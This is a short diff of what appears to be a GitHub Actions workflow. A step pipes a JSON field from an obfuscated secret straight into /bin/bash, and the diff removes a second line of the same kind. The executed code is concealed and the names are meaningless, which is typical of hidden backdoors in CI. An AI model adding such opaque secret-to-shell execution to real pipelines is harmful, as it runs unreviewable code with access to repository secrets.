@@ -21,7 +21,6 @@ jobs:
           hix467: ${{ secrets.hix467 }}
         run: |
           printf '%s' "$hix467" | jq -r .v48584 | /bin/bash
-          echo $tok801 | jq -r .ofob885 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
